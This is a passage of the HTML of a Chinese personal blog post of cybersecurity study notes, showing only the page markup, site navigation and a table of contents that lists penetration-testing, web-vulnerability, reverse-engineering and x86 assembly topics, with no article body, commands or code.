<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"withz.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="…">
<meta property="og:type" content="article">
<meta property="og:title" content="网络安全学习">
<meta property="og:url" content="https://withz.github.io/2020/09/20/%E5%AE%89%E5%85%A8/Kali/index.html">
<meta property="og:site_name" content="Withz">
<meta property="og:description" content="…">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2020-09-20T04:45:18.000Z">
<meta property="article:modified_time" content="2024-06-07T02:52:59.332Z">
<meta property="article:author" content="Peng">
<meta property="article:tag" content="Kali">
<meta property="article:tag" content="汇编">
<meta property="article:tag" content="逆向">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://withz.github.io/2020/09/20/%E5%AE%89%E5%85%A8/Kali/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://withz.github.io/2020/09/20/%E5%AE%89%E5%85%A8/Kali/","path":"2020/09/20/安全/Kali/","title":"网络安全学习"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>网络安全学习 | Withz</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Withz</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">64</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">11</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">51</span></a></li><li class="menu-item menu-item-tools"><a href="/tools/" rel="section"><i class="fa fa-flask fa-fw"></i>工具</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%BC%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">综述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">2.</span> <span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows"><span class="nav-number">2.1.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA"><span class="nav-number">2.1.1.</span> <span class="nav-text">IDA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OD"><span class="nav-number">2.1.2.</span> <span class="nav-text">OD</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kali"><span class="nav-number">2.2.</span> <span class="nav-text">Kali</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GDB"><span class="nav-number">2.2.1.</span> <span class="nav-text">GDB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PWNDGB"><span class="nav-number">2.2.2.</span> <span class="nav-text">PWNDGB</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kali-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">3.</span> <span class="nav-text">Kali 渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%87%E5%87%86"><span class="nav-number">3.1.</span> <span class="nav-text">标准</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E5%88%B6%E7%B3%BB%E7%BB%9F"><span class="nav-number">3.2.</span> <span class="nav-text">定制系统</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AE"><span class="nav-number">3.2.1.</span> <span class="nav-text">路由配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%96%B0"><span class="nav-number">3.2.2.</span> <span class="nav-text">系统更新</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6"><span class="nav-number">3.2.3.</span> <span class="nav-text">浏览器插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7"><span class="nav-number">3.2.4.</span> <span class="nav-text">网络工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NC-NETCAT"><span class="nav-number">3.2.4.1.</span> <span class="nav-text">NC - NETCAT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NCAT"><span class="nav-number">3.2.4.2.</span> <span class="nav-text">NCAT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Base64"><span class="nav-number">3.2.4.3.</span> <span class="nav-text">Base64</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E9%85%8D%E7%BD%AE"><span class="nav-number">3.2.5.</span> <span class="nav-text">其他配置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.3.</span> <span class="nav-text">被动信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%90%8D"><span class="nav-number">3.3.1.</span> <span class="nav-text">域名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.4.</span> <span class="nav-text">主动信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F"><span class="nav-number">3.4.1.</span> <span class="nav-text">主机扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.4.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="nav-number">3.4.3.</span> <span class="nav-text">服务扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%89%AB%E6%8F%8F"><span class="nav-number">3.4.4.</span> <span class="nav-text">操作系统扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="nav-number">3.5.</span> <span class="nav-text">漏洞扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%9F%A5%E8%AF%A2"><span class="nav-number">3.5.1.</span> <span class="nav-text">手工查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F%E5%99%A8"><span class="nav-number">3.5.2.</span> <span class="nav-text">弱点扫描器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-number">3.6.</span> <span class="nav-text">缓冲区溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-number">3.6.1.</span> <span class="nav-text">Linux 缓冲区溢出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-%E6%B8%97%E9%80%8F"><span class="nav-number">3.7.</span> <span class="nav-text">Web 渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Http"><span class="nav-number">3.7.1.</span> <span class="nav-text">Http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%A6%E5%AF%9F"><span class="nav-number">3.7.2.</span> <span class="nav-text">侦察</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F"><span class="nav-number">3.7.3.</span> <span class="nav-text">扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E6%8C%96%E6%B4%9E"><span class="nav-number">3.7.4.</span> <span class="nav-text">手动挖洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%98%E8%AE%A4%E5%BC%80%E9%80%9A%E6%9F%90%E4%BA%9B%E6%9C%8D%E5%8A%A1%EF%BC%8C%E5%8F%AF%E8%83%BD%E8%A2%AB%E6%94%BB%E5%87%BB%EF%BC%9A-phpMyAdmin-setup-Ubuntu-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85-PHP5-cgi"><span class="nav-number">3.8.</span> <span class="nav-text">默认开通某些服务，可能被攻击：- phpMyAdmin&#x2F;setup- Ubuntu 默认安装 PHP5-cgi</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">3.8.1.</span> <span class="nav-text">SQL 自动注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA"><span class="nav-number">3.9.</span> <span class="nav-text">靶场</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TurnKey"><span class="nav-number">3.9.1.</span> <span class="nav-text">TurnKey</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit"><span class="nav-number">3.9.2.</span> <span class="nav-text">Metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Vulhub"><span class="nav-number">3.9.3.</span> <span class="nav-text">Vulhub</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-number">3.9.4.</span> <span class="nav-text">模拟防火墙</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-%E6%89%AB%E6%8F%8F%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">4.</span> <span class="nav-text">Linux 扫描与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F-1"><span class="nav-number">4.1.</span> <span class="nav-text">主机扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#netstat-%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3"><span class="nav-number">4.1.1.</span> <span class="nav-text">netstat 查看端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A6%81%E7%94%A8-ICMP-%E8%BF%9E%E6%8E%A5"><span class="nav-number">4.1.2.</span> <span class="nav-text">禁用 ICMP 连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-Dump"><span class="nav-number">4.1.3.</span> <span class="nav-text">TCP Dump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fping-%E6%89%B9%E9%87%8F%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%EF%BC%88ICMP%EF%BC%89"><span class="nav-number">4.1.4.</span> <span class="nav-text">fping 批量主机扫描工具（ICMP）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hping-%E6%89%B9%E9%87%8F%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%EF%BC%88TCP-IP%EF%BC%89"><span class="nav-number">4.1.5.</span> <span class="nav-text">hping 批量主机扫描工具（TCP&#x2F;IP）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E6%89%AB%E6%8F%8F"><span class="nav-number">4.2.</span> <span class="nav-text">路由扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Trace-Route"><span class="nav-number">4.2.1.</span> <span class="nav-text">Trace Route</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MTR"><span class="nav-number">4.2.2.</span> <span class="nav-text">MTR</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E6%9C%8D%E5%8A%A1"><span class="nav-number">4.3.</span> <span class="nav-text">扫描服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NMAP"><span class="nav-number">4.3.1.</span> <span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NCAT-1"><span class="nav-number">4.3.2.</span> <span class="nav-text">NCAT</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1"><span class="nav-number">4.4.</span> <span class="nav-text">攻击防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IP-Tables"><span class="nav-number">4.5.</span> <span class="nav-text">IP Tables</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%8C%85%E5%90%AB%E6%9C%BA%E5%88%B6"><span class="nav-number">5.</span> <span class="nav-text">内存包含机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ASLR"><span class="nav-number">5.1.</span> <span class="nav-text">ASLR</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-1"><span class="nav-number">5.1.1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux"><span class="nav-number">5.1.2.</span> <span class="nav-text">Linux</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DEP"><span class="nav-number">5.2.</span> <span class="nav-text">DEP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E6%A0%88-Cookies"><span class="nav-number">5.3.</span> <span class="nav-text">堆栈 Cookies</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E6%A0%88%E7%B2%89%E7%A2%8E"><span class="nav-number">5.4.</span> <span class="nav-text">堆栈粉碎</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.</span> <span class="nav-text">Web 漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number">6.1.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">6.1.1.</span> <span class="nav-text">注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%A6%E6%88%AA"><span class="nav-number">6.1.2.</span> <span class="nav-text">拦截</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-%E6%8B%A6%E6%88%AA%E9%9B%86%E6%88%90%E5%BA%93"><span class="nav-number">6.1.3.</span> <span class="nav-text">XSS 拦截集成库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="nav-number">6.1.4.</span> <span class="nav-text">CSP 内容安全策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="nav-number">6.2.</span> <span class="nav-text">CSRF 跨站请求伪造</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">6.2.1.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookies"><span class="nav-number">6.3.</span> <span class="nav-text">Cookies</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="nav-number">6.4.</span> <span class="nav-text">点击劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-%E4%BC%A0%E8%BE%93%E7%AA%83%E5%90%AC"><span class="nav-number">6.5.</span> <span class="nav-text">HTTP 传输窃听</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8"><span class="nav-number">6.6.</span> <span class="nav-text">密码安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95"><span class="nav-number">6.6.1.</span> <span class="nav-text">哈希算法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E9%98%B2%E8%8C%83"><span class="nav-number">6.6.2.</span> <span class="nav-text">传输过程防范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E7%89%A9%E7%89%B9%E5%BE%81%E5%AF%86%E7%A0%81"><span class="nav-number">6.6.3.</span> <span class="nav-text">生物特征密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="nav-number">6.7.</span> <span class="nav-text">关系型数据库注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="nav-number">6.7.1.</span> <span class="nav-text">SQL 注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E9%97%AE%E9%A2%98"><span class="nav-number">6.8.</span> <span class="nav-text">上传问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF"><span class="nav-number">6.9.</span> <span class="nav-text">泄露信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows-%E9%80%86%E5%90%91"><span class="nav-number">7.</span> <span class="nav-text">Windows 逆向</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#OD-1"><span class="nav-number">7.1.</span> <span class="nav-text">OD</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BF%AB%E6%8D%B7%E9%94%AE"><span class="nav-number">7.1.1.</span> <span class="nav-text">快捷键</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%92%E4%BB%B6"><span class="nav-number">7.1.2.</span> <span class="nav-text">插件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B1%87%E7%BC%96"><span class="nav-number">7.2.</span> <span class="nav-text">汇编</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">7.2.1.</span> <span class="nav-text">寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MOV-%E7%B1%BB"><span class="nav-number">7.2.2.</span> <span class="nav-text">MOV 类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ADD-SUB"><span class="nav-number">7.2.3.</span> <span class="nav-text">ADD &#x2F; SUB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AND-OR-XOR-NOT"><span class="nav-number">7.2.4.</span> <span class="nav-text">AND &#x2F; OR &#x2F; XOR &#x2F; NOT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ADC-SBB"><span class="nav-number">7.2.5.</span> <span class="nav-text">ADC &#x2F; SBB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CMP-TEST"><span class="nav-number">7.2.6.</span> <span class="nav-text">CMP &#x2F; TEST</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JCC-%E7%B1%BB"><span class="nav-number">7.2.7.</span> <span class="nav-text">JCC 类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SET-%E7%B1%BB"><span class="nav-number">7.2.8.</span> <span class="nav-text">SET 类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XCHG"><span class="nav-number">7.2.9.</span> <span class="nav-text">XCHG</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#STOS"><span class="nav-number">7.2.10.</span> <span class="nav-text">STOS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#REP"><span class="nav-number">7.2.11.</span> <span class="nav-text">REP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%8D%E8%BF%90%E7%AE%97"><span class="nav-number">7.2.12.</span> <span class="nav-text">位运算</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98"><span class="nav-number">7.2.13.</span> <span class="nav-text">内存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E6%A0%88"><span class="nav-number">7.2.14.</span> <span class="nav-text">堆栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">7.2.15.</span> <span class="nav-text">标志寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E6%A0%88%E5%9B%BE"><span class="nav-number">7.2.16.</span> <span class="nav-text">堆栈图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-%E5%A0%86%E6%A0%88"><span class="nav-number">7.2.17.</span> <span class="nav-text">Windows 堆栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A3%B8%E5%87%BD%E6%95%B0"><span class="nav-number">7.2.18.</span> <span class="nav-text">裸函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"><span class="nav-number">7.2.19.</span> <span class="nav-text">调用约定</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3"><span class="nav-number">7.2.20.</span> <span class="nav-text">程序入口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-number">7.2.21.</span> <span class="nav-text">数据类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F"><span class="nav-number">7.2.22.</span> <span class="nav-text">变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-number">7.2.23.</span> <span class="nav-text">结构体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sizeof"><span class="nav-number">7.2.24.</span> <span class="nav-text">Sizeof</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%9B%BE"><span class="nav-number">7.2.25.</span> <span class="nav-text">内存图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%94%AF%E8%AF%AD%E5%8F%A5"><span class="nav-number">7.2.26.</span> <span class="nav-text">分支语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5"><span class="nav-number">7.2.27.</span> <span class="nav-text">循环语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E9%92%88"><span class="nav-number">7.2.28.</span> <span class="nav-text">指针</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E5%A3%B3"><span class="nav-number">7.2.29.</span> <span class="nav-text">加壳</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PE"><span class="nav-number">7.2.30.</span> <span class="nav-text">PE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E7%99%BD%E5%8C%BA%E5%8A%A0%E4%BB%A3%E7%A0%81"><span class="nav-number">7.2.31.</span> <span class="nav-text">空白区加代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8A%82"><span class="nav-number">7.2.32.</span> <span class="nav-text">节</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%AD%97%E5%85%B8"><span class="nav-number">7.2.33.</span> <span class="nav-text">数据字典</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%87%BA%E8%A1%A8"><span class="nav-number">7.2.34.</span> <span class="nav-text">导出表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%85%A5%E8%A1%A8"><span class="nav-number">7.2.35.</span> <span class="nav-text">导入表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8"><span class="nav-number">7.2.36.</span> <span class="nav-text">重定位表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IAT%E8%A1%A8"><span class="nav-number">7.2.37.</span> <span class="nav-text">IAT表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-API"><span class="nav-number">7.2.38.</span> <span class="nav-text">Windows API</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">7.2.38.1.</span> <span class="nav-text">关键字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 